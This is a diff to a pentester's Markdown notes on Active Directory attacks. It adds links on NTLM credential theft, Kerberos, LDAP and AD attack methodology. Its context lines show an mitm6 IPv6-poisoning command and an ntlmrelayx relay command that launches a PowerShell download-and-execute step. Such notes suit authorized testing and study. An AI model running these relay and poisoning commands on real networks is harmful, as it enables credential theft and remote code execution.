@@ -215,10 +215,30 @@ impacket-ntlmrelayx  -tf target.txt -smb2support -c "powershell IEX(New-Object N
 ```Shell
 mitm6 -d yuncorp.local
 ```
+NTLM
+
+https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds
 
 ### AD
 
 https://book.hacktricks.xyz/windows/active-directory-methodology
+
+Kerberos cheatsheet
+
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
+
+LDAP
+
+https://book.hacktricks.xyz/pentesting/pentesting-ldap
+
+AD
+
+https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
+
+https://mpgn.gitbook.io/crackmapexec/getting-started/using-kerberos
 
 *** Error: clock skew too great  - Importante sincronisar tiempo con DC "rdate -n 10.10.10.52"
 
